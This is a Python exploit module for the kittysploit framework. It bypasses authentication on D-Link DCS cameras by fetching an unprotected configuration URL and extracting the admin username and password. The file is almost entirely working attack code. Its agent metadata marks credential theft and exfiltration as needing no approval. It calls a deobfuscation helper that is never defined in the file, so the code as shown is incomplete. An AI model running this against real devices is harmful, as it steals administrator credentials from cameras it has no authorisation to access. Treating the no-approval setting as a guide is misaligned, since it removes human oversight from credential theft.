#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""D-Link DCS Cameras Authentication Bypass"""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client



class Module(Auxiliary, Http_client):
    __info__ = {
        'name': 'D-Link DCS Cameras Authentication Bypass',
        'description': 'D-Link DCS web cameras allow unauthenticated attackers to obtain the configuration of the device remotely. A copy of the device configuration can be obtained by accessing unprocteted URL.',
        'author': ['Roberto Paleari', 'Dino Causevic'],
        
        'platform': Platform.LINUX,
        'references': ['https://www.exploit-db.com/exploits/24442/'],
        'tags': ['iot', 'camera', 'unauth', 'auxiliary'],
        'agent': {
            'risk': 'active',
            'effects': ['credential_access', 'data_exfiltration'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['credentials', 'risk_signals'],
        },
    }

    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(8080, "Target HTTP port")

    def run(self):
        if self.check():
            print_success("Target appears to be vulnerable.")

            admin_id = None
            admin_password = None

            if self.config_content and len(self.config_content):

                for line in self.config_content.split("\n"):
                    line = line.strip()

                    m_groups = re.match(r"AdminID=(.*)", line, re.I | re.M)
                    if m_groups:
                        print_success("Found Admin ID.")
                        admin_id = m_groups.group(1)

                    m_groups = re.match(r'AdminPassword=(.*)', line, re.I | re.M)
                    if m_groups:
                        print_success("Found Admin password.")
                        admin_password = m_groups.group(1)
                        break

                print_table(("AdminId", "Password"), (admin_id, admin_password))

        else:
            print_error("Exploit failed - target seems to be not vulnerable")
    def check(self):
        response = self.http_request(
            method="GET",
            path="/frame/GetConfig"
        )

        if response and response.status_code == 200 and len(response.content):
            self.config_content = self._deobfuscate(response.content)

            if self.config_content and any([x in self.config_content for x in ["AdminID=", "AdminPassword="]]):
                return True  # target is vulnerable

        return False  # target is not vulnerable
